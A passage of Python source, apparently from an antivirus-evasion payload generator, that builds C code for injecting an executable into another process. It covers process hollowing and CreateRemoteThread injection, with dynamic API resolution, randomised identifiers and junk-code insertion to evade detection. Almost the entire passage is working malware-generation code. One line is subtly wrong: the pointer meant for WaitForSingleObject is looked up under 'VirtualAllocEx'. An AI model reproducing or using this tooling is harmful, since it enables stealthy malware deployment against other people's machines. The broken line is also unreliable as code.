    Ret_code += "if((" + RandImgSectHeader + "->Characteristics) & IMAGE_SCN_MEM_NOT_CACHED){\n"
    Ret_code += RandlNewProtect + " |= PAGE_NOCACHE;}\n"

    if ModOpt["DynImport"] == True:

        Ret_code += NdcVirtualProtectEx + "(" + Randpi + ".hProcess,(PVOID)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgSectHeader + "->VirtualAddress)," + RandImgSectHeader + "->SizeOfRawData," + RandlNewProtect + ",&" + RandlOldProtect + ");}\n"
    else:
        Ret_code += "VirtualProtectEx(" + Randpi + ".hProcess,(PVOID)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgSectHeader + "->VirtualAddress)," + RandImgSectHeader + "->SizeOfRawData," + RandlNewProtect + ",&" + RandlOldProtect + ");}\n"

    if ModOpt["ExecMethod"] in ["ProcessHollowing","PH"]:

        if ModOpt["DynImport"] == True:

            NdcSetThreadContext = varname_creator()
            NdcResumeThread = varname_creator()

            if ModOpt["Arch"] == "x86":

                Ret_code += RandTcontext + ".Eax = (SIZE_T)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint);\n"
                Ret_code += NdcWriteProcessMemory + "(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Ebx + 8),&" + RandlpNewImgBAddr + ",sizeof(" + RandlpNewImgBAddr + "), NULL);\n"

            else:

                Ret_code += RandTcontext + ".Rcx = (SIZE_T)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint);\n"
                Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext + ".Rdx+(sizeof(SIZE_T)*2)),&" + RandlpNewImgBAddr + ",sizeof(" + RandlpNewImgBAddr + "), NULL);\n"

            Ret_code += "FARPROC " + NdcSetThreadContext + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"SetThreadContext\");\n"
            Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"ResumeThread\");\n"
            Ret_code += NdcSetThreadContext + "(" + Randpi + ".hThread,&" + RandTcontext+ ");\n"
            Ret_code += NdcResumeThread + "(" + Randpi + ".hThread);\n"

        else:

            if ModOpt["Arch"] == "x86":
                Ret_code += RandTcontext + ".Eax = (SIZE_T)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint);\n"
                Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext+ ".Ebx + 8),&" + RandlpNewImgBAddr + ",sizeof(" + RandlpNewImgBAddr + "), NULL);\n"

            else:

                Ret_code += RandTcontext + ".Rcx = (SIZE_T)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint);\n"
                Ret_code += "WriteProcessMemory(" + Randpi + ".hProcess,(PVOID)(" + RandTcontext + ".Rdx+(sizeof(SIZE_T)*2)),&" + RandlpNewImgBAddr + ",sizeof(" + RandlpNewImgBAddr + "), NULL);\n"

            Ret_code += "SetThreadContext(" + Randpi + ".hThread,&" + RandTcontext+ ");\n"
            Ret_code += "ResumeThread(" + Randpi + ".hThread);\n"

        Ret_code += "return 1;\n"
        Ret_code += "}}\n"

    elif ModOpt["ExecMethod"] in ["Chimera","C"]:

        Randthread = varname_creator()
        Randhand = varname_creator()
        Randresult = varname_creator()

        if ModOpt["DynImport"] == True:

            NdcCreateRemoteThread = varname_creator()
            NdcWaitForSingleObject = varname_creator()
            
            Ret_code += "DWORD " + Randthread + ";\n"
            Ret_code += "FARPROC " + NdcCreateRemoteThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateRemoteThread\");\n"
            Ret_code += "HANDLE " + Randhand + " = (HANDLE)" + NdcCreateRemoteThread + "(" + RandhProcess + ",NULL,0,(LPTHREAD_START_ROUTINE)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint),NULL,0,&"+ Randthread + ");\n"
            Ret_code += "FARPROC " + NdcWaitForSingleObject + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"VirtualAllocEx\");\n"
            Ret_code += NdcWaitForSingleObject + "(" + Randhand + ",-1);}}}}\n"

        else:
            Ret_code += "DWORD " + Randthread + ";\n"
            Ret_code += "HANDLE " + Randhand + " = CreateRemoteThread(" + RandhProcess + ",NULL,0,(LPTHREAD_START_ROUTINE)((LPBYTE)" + RandlpNewImgBAddr + "+" + RandImgNTHeader + "->OptionalHeader.AddressOfEntryPoint),NULL,0,&"+ Randthread + ");\n"
            Ret_code += "DWORD " + Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}}}}\n"

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])

    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)

